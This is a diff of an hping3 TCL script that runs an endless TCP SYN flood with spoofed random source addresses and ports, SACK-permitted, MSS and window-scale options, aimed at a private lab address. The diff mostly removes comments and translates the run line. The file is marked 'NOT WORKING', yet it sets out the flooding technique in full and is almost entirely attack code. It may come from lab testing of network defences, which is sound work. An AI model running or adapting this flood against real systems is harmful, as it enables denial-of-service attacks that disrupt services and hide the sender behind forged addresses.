@@ -1,7 +1,5 @@
-# tcp_sack.htcl
-# NOT WORKING
-
 # TCP SYN Flood with SACK Permitted (tcpopt.sackperm) using hping3 TCL scripting
+# NOT WORKING
 
 set dst_ip "192.168.100.2"
 set dst_port 50001
@@ -9,12 +7,10 @@ set window 8192
 set seq 0
 set count 0
 
-# Function to generate random IP address
 proc random_ip {} {
     return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
 }
 
-# Function to generate random source port (1024–65535)
 proc random_port {} {
     return [expr {int(rand()*64512) + 1024}]
 }
@@ -22,14 +18,13 @@ proc random_port {} {
 while {1} {
     set saddr [random_ip]
     set sport [random_port]
-    # TCP SYN packet with SACK permitted, MSS and Window Scale
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+tcp(sport=$sport,dport=$dst_port,flags=s,win=$window,seq=$seq)+tcpopt.mss(val=1460)+tcpopt.sackperm()+tcpopt.wscale(val=2)"
     hping send $pkt
     incr count
-    # Print every 1000 packets sent
+
     if {[expr {$count % 1000}] == 0} {
         puts "$count TCP SYN+SACK packets sent so far..."
     }
 }
 
-# To run: sudo hping3 exec tcp_sack.htcl
+# Comando: sudo hping3 exec tcp_sack.htcl
